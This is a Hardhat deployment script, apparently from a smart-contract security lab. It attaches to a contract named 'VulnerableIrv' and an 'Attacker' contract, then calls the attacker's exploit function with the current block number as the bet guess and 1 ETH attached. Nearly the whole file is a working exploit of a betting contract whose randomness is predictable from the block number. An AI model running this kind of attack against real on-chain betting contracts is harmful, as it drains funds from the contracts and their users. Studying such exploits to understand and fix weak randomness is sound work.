const { ethers } = require("hardhat");
const fs = require('fs');
const ethersModule = require("ethers"); // Import ethers directly

// Deploy and invoke functions in the same script.
async function main() {
    const [deployer] = await hre.ethers.getSigners();

    // Get the deployed contract instances
    const contractName = "VulnerableIrv";
    const VulnerableIrv = await hre.ethers.getContractFactory(contractName);
    const Attacker = await hre.ethers.getContractFactory("Attacker");

    // // Replace with the deployed contract addresses
    const addresses = JSON.parse(fs.readFileSync("deployedAddresses_"+contractName+".json"));
    const contractAddress = addresses.contractAddress;
    const attackerAddress = addresses.attackerAddress;
    console.log(`Using contract address: ${contractAddress}`);
    console.log(`Using Attacker address: ${attackerAddress}`);

    const contract = VulnerableIrv.attach(contractAddress);
    const attacker = Attacker.attach(attackerAddress);

    // Set up attack parameters
    const blockNumber = await ethers.provider.getBlockNumber();
    const betGuess = 
      // ethers.BigNumber.from(blockNumber.toString());
      ethers.parseUnits(blockNumber.toString(), 0);
    
    console.log(`Using block number ${betGuess.toString()} as the bet guess`);

    // Perform the attack by calling the `exploit` function on the Attacker contract
    const attackTx = await attacker.exploit(betGuess, { value: ethers.parseEther("1") });
    console.log("Transaction sent for attack. Waiting for confirmation...");

    // Wait for transaction confirmation
    await attackTx.wait();
    console.log("Attack transaction confirmed!");

    console.log("Attack executed with guess:", betGuess.toString());
}

// Execute script
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});